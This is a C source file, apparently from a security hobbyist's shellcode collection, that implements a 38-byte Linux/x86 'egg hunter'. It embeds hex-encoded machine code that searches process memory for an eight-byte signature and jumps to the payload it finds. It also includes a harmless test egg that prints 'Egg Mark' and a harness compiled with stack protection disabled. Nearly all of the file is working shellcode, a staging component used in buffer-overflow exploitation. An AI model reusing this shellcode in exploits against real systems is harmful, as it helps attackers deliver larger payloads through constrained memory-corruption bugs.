/*

   Egg Hunter Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   egg_hunter_shellcode

   * 38 bytes
   * null-free if egg signature is

   # gcc -m32 -fno-stack-protector -z execstack egg_hunter_shellcode.c -o egg_hunter_shellcode

   Testing
   # ./egg_hunter_shellcode

*/

#include <stdio.h>
#include <string.h>

unsigned char egg[] = \

              // Write "Egg Mark" and exit

              "\x90\x50\x90\x50"   // <- First Four Bytes of Signature
              "\x90\x50\x90\x50"   // <- Same first bytes are mandatory
              "\x31\xdb"
              "\xf7\xe3\xb0\x04\x6a\x0a\x68\x4d\x61\x72"
              "\x6b\x68\x45\x67\x67\x20\xb3\x01\x89\xe1"
              "\xb2\x09\xcd\x80\xb0\x01\xcd\x80";

              unsigned char egghunter[] = \

              // Search for the Egg Signature (0x50905090 x 2) - the Egg's 8 first instructions (nop, push eax, nop, push eax...)

              "\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f"
              "\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c"
              "\xf2\x74\xee\xb8"
              "\x90\x50\x90\x50"   // <- Signature
              "\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(egghunter));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Setting the egg hunter signature to search (byte reverse order)

            "movl $0x50905090, (egghunter+24)\n\t"

            // Calling the shellcode
            "call egghunter");

}